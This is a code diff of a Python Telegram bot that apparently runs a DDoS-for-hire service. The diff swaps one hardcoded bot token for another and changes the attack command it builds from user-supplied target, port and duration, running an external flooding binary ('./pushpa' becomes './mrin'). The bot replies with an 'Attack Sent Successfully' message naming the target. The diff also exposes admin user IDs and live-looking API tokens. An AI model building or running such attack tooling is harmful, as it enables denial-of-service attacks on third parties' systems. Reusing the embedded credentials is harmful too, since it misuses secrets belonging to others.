@@ -13,7 +13,7 @@ from telebot import types
 from dateutil.relativedelta import relativedelta
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7964023747:AAHloMMgPT20VetRTgfkUgpdrrnIJS4VppU')
+bot = telebot.TeleBot('7775840737:AAFmUfq_O-IctYTJ13ErkiJ-_8XQqiGL-dA')
 
 # Admin user IDs
 admin_id = {"6768273586", "2007860433"}
@@ -379,7 +379,7 @@ def process_attack_details(message):
                 # Record and log the attack
                 record_command_logs(user_id, 'attack', target, port, time)
                 log_command(user_id, target, port, time)
-                full_command = f"./pushpa {target} {port} {time} 900"
+                full_command = f"./mrin {target} {port} {time} 1200"
                 username = message.chat.username or "No username"
                 # Send immediate response that the attack is being executed
                 response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
